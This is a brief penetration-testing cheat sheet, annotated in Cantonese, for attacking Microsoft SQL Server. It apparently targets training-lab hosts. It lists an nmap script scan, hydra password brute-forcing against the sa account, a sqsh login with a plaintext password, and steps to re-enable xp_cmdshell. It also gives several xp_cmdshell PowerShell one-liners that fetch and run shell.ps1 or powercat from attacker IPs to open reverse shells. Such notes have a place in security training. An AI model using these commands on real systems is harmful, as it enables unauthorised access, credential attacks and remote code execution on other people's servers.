# Mssql

```
sqsh -S 192.168.1.101 -U sa  
sqsh -S 10.10.10.59 -U sa -P "YE%TJC%&HYbe5Nw"
```

- Nmap Information Gathering
```
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes    --script-args mssql.instance port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip
```

- Brute-forcing

```
hydra -l 'sa' -P /usr/share/wordlists/rockyou.txt 10.11.1.111 mssql
```

- password hash裝左係master.mdf
https://blog.xpnsec.com/extracting-master-mdf-hashes/
## Basic SQL commands

```sql
# list databases
SELECT name FROM master..sysdatabases
go

# list tables
SELECT name FROM [database_name]..sysobjects
go

# get reverse shell
xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.45:5555/shell.ps1')"
go
```

- 如果係用sa ac login,應該可以run command
  ```
  xp_cmdshell 'whoami';
  go
  ```
  如果diable咗, 但因為我地係sa, 我地都可以enable佢
  ```sql
  EXEC sp_configure 'show advanced options', 1;
  go
  RECONFIGURE; 
  go

  EXEC sp_configure 'xp_cmdshell', 1;
  go
  RECONFIGURE;
  go;
  ```

  ## SQLI
  > https://www.exploit-db.com/papers/12975 
  ```
  EXEC xp_cmdshell 'powershell -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString("http://10.0.0.1:8080/powercat.ps1");powercat -c 10.0.0.1 -p 443 -e cmd' 

  EXEC xp_cmdshell 'powershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString("http://192.168.119.140/shell.ps1")'
  ```